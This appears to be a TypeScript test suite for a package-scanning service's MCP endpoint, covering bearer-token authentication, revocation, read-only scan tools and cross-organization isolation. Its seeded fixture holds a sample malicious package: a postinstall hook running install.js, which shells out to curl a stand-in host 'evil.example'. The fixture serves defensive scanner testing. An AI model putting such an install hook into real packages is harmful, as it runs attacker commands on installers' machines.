import { createExecutionContext, env, waitOnExecutionContext } from "cloudflare:test";
import { eq } from "drizzle-orm";
import { Hono } from "hono";
import { describe, expect, test } from "vitest";
import {
  createApiToken,
  createDb,
  createScanJob,
  ensurePersonalOrganization,
  persistScan,
} from "../../server/db";
import * as schema from "../../server/db/schema";
import { generateApiToken, hashApiToken } from "../../server/lib/api-token";
import { DETERMINISTIC_RULES_VERSION, createPackageDiff } from "../../server/lib/review";
import type { ScanRiskBreakdown } from "../../server/lib/risk";
import { writeScanArtifacts } from "../../server/lib/scan-artifacts";
import { sha256Hex, stableJson } from "../../server/lib/stable-json";
import { apiTokensRoutes } from "../../server/routes/api-tokens";
import { mcpRoutes } from "../../server/routes/mcp";
import type { Bindings, Variables } from "../../server/types";

interface SeededUser {
  userId: string;
  organizationId: string;
}

async function seedUser(): Promise<SeededUser> {
  const db = createDb(env.DB);
  const now = new Date();
  const userId = `user_${crypto.randomUUID()}`;
  await db.insert(schema.user).values({
    id: userId,
    name: "MCP Tester",
    email: `${userId}@example.com`,
    emailVerified: true,
    createdAt: now,
    updatedAt: now,
  });
  const organizationId = await ensurePersonalOrganization(db, { userId });
  return { userId, organizationId };
}

const disabledAi = {
  status: "unavailable",
  risk: "low",
  releaseAssessment: "not_assessed",
  summary: "AI review is disabled.",
  findings: [],
  requiresManualReview: false,
  model: null,
};

const safety = {
  tokenExposedToSandbox: false,
  directSandboxNetwork: false,
  outboundPolicy: "test outbound policy",
  aiInputPolicy: "test AI policy",
  fileExplorerPolicy: "test file policy",
};

// Seed a completed, artifact-backed scan with one high-severity finding so the
// MCP evidence tools have real redacted samples + a report to read.
async function seedCompleteScan(owner: SeededUser): Promise<string> {
  const db = createDb(env.DB);
  const scanId = `scan_${crypto.randomUUID()}`;
  const stageId = `stage-${crypto.randomUUID().slice(0, 12)}`;
  const packageName = "@org/mcp-fixture";
  const packageText = JSON.stringify({
    name: packageName,
    version: "1.0.0",
    scripts: { postinstall: "node install.js" },
  });
  const files = [
    {
      path: "package.json",
      size: packageText.length,
      sha256: "pkg-sha",
      flags: [],
      textSample: packageText,
    },
    {
      path: "install.js",
      size: 48,
      sha256: "install-sha",
      flags: [],
      textSample: "require('child_process').exec('curl evil.example');\n",
    },
  ];
  const diff = createPackageDiff([], files);
  const findings = [
    {
      severity: "high" as const,
      file: "install.js",
      line: 1,
      evidence: "child_process.exec",
      reason: "install script spawns a shell command",
      ruleId: "code.process-spawn",
      ruleVersion: DETERMINISTIC_RULES_VERSION,
    },
  ];
  const risk: ScanRiskBreakdown = {
    artifactRisk: "high",
    releaseRisk: "high",
    contextRisk: "low",
    releaseFindingCount: 1,
    contextFindingCount: 0,
    unknownFindingCount: 0,
  };
  const reportPayload = {
    version: 1,
    rulesVersion: DETERMINISTIC_RULES_VERSION,
    stageId,
    package: {
      name: packageName,
      stagedVersion: "1.0.0",
      stagedTag: "latest",
      previousVersion: null,
    },
    baseline: null,
    fileCount: files.length,
    previousFileCount: 0,
    packageJson: null,
    packageJsonDiff: {},
    diff,
    ruleFindings: findings,
    findingAnnotations: [{ findingIndex: 0, diffStatus: "added", releaseDelta: true }],
    aiFindings: disabledAi,
    risk,
    safety,
  };
  const reportJson = stableJson(reportPayload);
  const digest = await sha256Hex(reportJson);
  const artifacts = await writeScanArtifacts(env.ARTIFACTS, {
    organizationId: owner.organizationId,
    scanId,
    reportJson,
    reportDigest: digest,
    files,
    diff,
    generatedAt: "2026-06-08T00:00:00.000Z",
  });

  await createScanJob(db, {
    id: scanId,
    stageId,
    organizationId: owner.organizationId,
    ownerUserId: owner.userId,
  });
  await persistScan(db, {
    id: scanId,
    stageId,
    organizationId: owner.organizationId,
    ownerUserId: owner.userId,
    packageJson: null,
    risk: "high",
    status: "complete",
    summary: {
      report: {
        version: 1,
        digest,
        digestAlgorithm: "sha256",
        generatedAt: "2026-06-08T00:00:00.000Z",
        rulesVersion: DETERMINISTIC_RULES_VERSION,
      },
      packageJsonDiff: {},
      diff,
      risk,
      baseline: null,
      safety,
    },
    ai: disabledAi,
    files,
    diff,
    findings,
    riskSummary: risk,
    report: { version: 1, digest },
    artifacts,
  });
  return scanId;
}

async function issueToken(owner: SeededUser, name = "test-agent"): Promise<string> {
  const db = createDb(env.DB);
  const generated = await generateApiToken();
  await createApiToken(db, {
    organizationId: owner.organizationId,
    name,
    tokenHash: generated.tokenHash,
    tokenPrefix: generated.tokenPrefix,
    scope: "read",
    createdByUserId: owner.userId,
  });
  return generated.token;
}

function mcpApp() {
  const app = new Hono<{ Bindings: Bindings; Variables: Variables }>();
  app.route("/mcp", mcpRoutes);
  return app;
}

let rpcId = 0;

async function callMcp(
  app: Hono<{ Bindings: Bindings; Variables: Variables }>,
  token: string | null,
  method: string,
  params?: unknown,
) {
  const ctx = createExecutionContext();
  const headers = new Headers({ "content-type": "application/json" });
  if (token) headers.set("authorization", `Bearer ${token}`);
  const res = await app.fetch(
    new Request("http://test.local/mcp", {
      method: "POST",
      headers,
      body: JSON.stringify({ jsonrpc: "2.0", id: ++rpcId, method, params }),
    }),
    env,
    ctx,
  );
  await waitOnExecutionContext(ctx);
  return res;
}

async function callTool(
  app: Hono<{ Bindings: Bindings; Variables: Variables }>,
  token: string,
  name: string,
  args: Record<string, unknown>,
) {
  const res = await callMcp(app, token, "tools/call", { name, arguments: args });
  const body = (await res.json()) as {
    result?: { structuredContent?: unknown; isError?: boolean };
  };
  return {
    res,
    structured: body.result?.structuredContent,
    isError: body.result?.isError ?? false,
  };
}

describe("MCP endpoint auth", () => {
  test("rejects a missing bearer token", async () => {
    const app = mcpApp();
    const res = await callMcp(app, null, "tools/list");
    expect(res.status).toBe(401);
    expect(res.headers.get("www-authenticate")).toContain("Bearer");
  });

  test("rejects an unknown token", async () => {
    const app = mcpApp();
    const res = await callMcp(app, "dryd_pat_not-a-real-token", "tools/list");
    expect(res.status).toBe(401);
  });

  test("rejects a revoked token", async () => {
    const owner = await seedUser();
    const token = await issueToken(owner);
    const db = createDb(env.DB);
    await db
      .update(schema.apiTokens)
      .set({ revokedAt: new Date(Date.now() - 1000) })
      .where(eq(schema.apiTokens.tokenHash, await hashApiToken(token)));
    const app = mcpApp();
    const res = await callMcp(app, token, "tools/list");
    expect(res.status).toBe(401);
  });
});

describe("MCP protocol", () => {
  test("initialize advertises the server + protocol version", async () => {
    const owner = await seedUser();
    const token = await issueToken(owner);
    const res = await callMcp(mcpApp(), token, "initialize");
    const body = (await res.json()) as {
      result: { protocolVersion: string; serverInfo: { name: string } };
    };
    expect(body.result.protocolVersion).toBe("2024-11-05");
    expect(body.result.serverInfo.name).toBe("drydock-scan-agent");
  });

  test("tools/list returns the read-only scan tool set", async () => {
    const owner = await seedUser();
    const token = await issueToken(owner);
    const res = await callMcp(mcpApp(), token, "tools/list");
    const body = (await res.json()) as { result: { tools: Array<{ name: string }> } };
    const names = body.result.tools.map((t) => t.name).sort();
    expect(names).toEqual(
      [
        "find_scans",
        "get_scan_report",
        "get_scan_status",
        "list_scan_events",
        "list_scan_files",
        "read_scan_files",
        "search_scan_files",
      ].sort(),
    );
  });
});

describe("MCP scan tools", () => {
  test("find_scans + reports surface the seeded scan for its org", async () => {
    const owner = await seedUser();
    const token = await issueToken(owner);
    const scanId = await seedCompleteScan(owner);
    const app = mcpApp();

    const found = await callTool(app, token, "find_scans", { decisionFilter: "all" });
    const scans = (found.structured as { scans: Array<{ id: string }> }).scans;
    expect(scans.some((s) => s.id === scanId)).toBe(true);

    const report = await callTool(app, token, "get_scan_report", { scanId });
    const payload = report.structured as {
      riskSummary: { releaseRisk: string } | null;
      findings: Array<{ ruleId: string | null; diffStatus: string }>;
    };
    expect(payload.riskSummary?.releaseRisk).toBe("high");
    expect(payload.findings[0]?.ruleId).toBe("code.process-spawn");
    expect(payload.findings[0]?.diffStatus).toBe("added");
  });

  test("read_scan_files returns bounded redacted text; search finds a token", async () => {
    const owner = await seedUser();
    const token = await issueToken(owner);
    const scanId = await seedCompleteScan(owner);
    const app = mcpApp();

    const read = await callTool(app, token, "read_scan_files", {
      scanId,
      paths: ["install.js"],
    });
    const readPayload = read.structured as {
      results: Array<{ ok: boolean; content: string | null }>;
    };
    expect(readPayload.results[0]?.ok).toBe(true);
    expect(readPayload.results[0]?.content).toContain("child_process");

    const search = await callTool(app, token, "search_scan_files", {
      scanId,
      queries: ["child_process"],
    });
    const searchPayload = search.structured as {
      results: Array<{ matches: Array<{ path: string }> }>;
    };
    expect(searchPayload.results[0]?.matches.some((m) => m.path === "install.js")).toBe(true);
  });

  test("list_scan_files filters to finding files", async () => {
    const owner = await seedUser();
    const token = await issueToken(owner);
    const scanId = await seedCompleteScan(owner);
    const app = mcpApp();
    const listed = await callTool(app, token, "list_scan_files", { scanId, filter: "findings" });
    const payload = listed.structured as { files: Array<{ path: string }> };
    expect(payload.files.some((f) => f.path === "install.js")).toBe(true);
  });

  test("unknown scan id is a tool error, not a leak", async () => {
    const owner = await seedUser();
    const token = await issueToken(owner);
    const app = mcpApp();
    const report = await callTool(app, token, "get_scan_report", { scanId: "scan_missing" });
    expect(report.isError).toBe(true);
  });
});

describe("MCP org scoping", () => {
  test("a token cannot see another organization's scan", async () => {
    const owner = await seedUser();
    const other = await seedUser();
    const scanId = await seedCompleteScan(owner);
    const otherToken = await issueToken(other);
    const app = mcpApp();

    const found = await callTool(app, otherToken, "find_scans", { decisionFilter: "all" });
    const scans = (found.structured as { scans: Array<{ id: string }> }).scans;
    expect(scans.some((s) => s.id === scanId)).toBe(false);

    const report = await callTool(app, otherToken, "get_scan_report", { scanId });
    expect(report.isError).toBe(true);

    const read = await callTool(app, otherToken, "read_scan_files", {
      scanId,
      paths: ["install.js"],
    });
    expect(read.isError).toBe(true);
  });
});

describe("API token management route", () => {
  function tokenApp(session: { userId: string }) {
    const app = new Hono<{ Bindings: Bindings; Variables: Variables }>();
    app.use("*", async (c, next) => {
      c.set("authSession", { userId: session.userId });
      await next();
    });
    app.route("/api/v1/api-tokens", apiTokensRoutes);
    return app;
  }

  async function fetchJson(
    app: Hono<{ Bindings: Bindings; Variables: Variables }>,
    owner: SeededUser,
    path: string,
    options: RequestInit = {},
  ) {
    const ctx = createExecutionContext();
    const headers = new Headers(options.headers);
    headers.set("content-type", "application/json");
    headers.set("x-organization-id", owner.organizationId);
    const res = await app.fetch(
      new Request(`http://test.local${path}`, { ...options, headers }),
      env,
      ctx,
    );
    await waitOnExecutionContext(ctx);
    return res;
  }

  test("create returns the secret once, then it authenticates MCP; revoke disables it", async () => {
    const owner = await seedUser();
    const app = tokenApp(owner);

    const created = await fetchJson(app, owner, "/api/v1/api-tokens", {
      method: "POST",
      body: JSON.stringify({ name: "ci-agent" }),
    });
    expect(created.status).toBe(201);
    const createdBody = (await created.json()) as { token: { id: string }; secret: string };
    expect(createdBody.secret.startsWith("dryd_pat_")).toBe(true);

    // The freshly minted secret works against the MCP endpoint.
    const ok = await callMcp(mcpApp(), createdBody.secret, "tools/list");
    expect(ok.status).toBe(200);

    const listed = await fetchJson(app, owner, "/api/v1/api-tokens");
    const listBody = (await listed.json()) as {
      tokens: Array<{ id: string; tokenPrefix: string }>;
    };
    expect(listBody.tokens.some((t) => t.id === createdBody.token.id)).toBe(true);
    // Only display metadata is ever returned; no secret/hash.
    expect(JSON.stringify(listBody)).not.toContain(createdBody.secret);

    const revoked = await fetchJson(app, owner, `/api/v1/api-tokens/${createdBody.token.id}`, {
      method: "DELETE",
    });
    expect(revoked.status).toBe(200);

    const afterRevoke = await callMcp(mcpApp(), createdBody.secret, "tools/list");
    expect(afterRevoke.status).toBe(401);
  });
});
